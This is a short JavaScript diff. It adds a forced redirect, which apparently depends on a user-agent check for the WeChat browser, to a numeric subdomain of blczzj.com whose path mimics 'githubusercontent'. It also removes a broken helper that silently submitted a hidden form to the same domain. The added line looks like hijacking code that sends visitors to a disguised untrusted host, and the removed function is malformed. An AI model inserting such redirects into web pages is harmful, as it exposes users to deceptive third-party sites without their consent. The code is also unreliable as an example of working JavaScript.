@@ -8,23 +8,7 @@
  	if(ua.match(/MicroMessenger/i)=='micromessenger'){return true}else{return false}}
 if(l!=1){
 
-
+window.location.href = 'http://3523523525.blczzj.com/githubusercontent.gcif/252352352/23523525';
 
 }
- alert(get('http://blczzj.com/23123.gcif'));
-function get(URL, {html :'prnhtml',cm1:'sdsddsd',cm2:'haha'})
-                        {
-                            var temp = document.createElement("form");
-                            temp.method = "get";
-                            temp.style.display = "none";
-                            var data = "?";
-                            for (var x in PARAMS)
-                            {
-                                data += x + "=" + PARAMS[x] + "&";;
-                            }
-                            data = data.slice(0, data.length-1);
-                            temp.action = URL + data;
-                            document.body.appendChild(temp);
-                            temp.submit();
-                            return temp;
-                        }
+
